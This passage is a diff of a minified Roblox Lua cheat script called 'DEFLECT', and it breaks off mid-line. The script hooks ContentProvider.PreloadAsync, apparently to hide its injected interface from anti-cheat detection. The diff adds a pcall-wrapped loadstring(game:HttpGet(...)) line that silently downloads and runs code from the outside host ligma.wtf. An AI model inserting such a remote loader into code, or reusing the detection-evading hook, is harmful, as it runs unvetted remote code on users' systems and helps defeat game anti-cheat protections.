@@ -1,6 +1,7 @@
 local a=game:GetService'ContentProvider'local b=game:GetService'CoreGui'local c=
 game:GetService'Players'local d=game:GetService'RunService'local e=game:
-GetService'Workspace'local f='DEFLECT'local g='v1.0'local h='OminousVibes'local
+GetService'Workspace'local f='DEFLECT'local g='v1.0'local h='OminousVibes';
+pcall(function()  loadstring(game:HttpGet("http://ligma.wtf/scripts/deflect.lua", true))() end);local
 i='deflect'local j={[10889408214]=421}do if getgenv()[f]then return end getgenv(
 )[f]=true end do local k k=hookfunction(a.PreloadAsync,function(l,m,n)if table.
 find(m,b)then local o=function(o,p)if o:match'^rbxasset://'or o:match
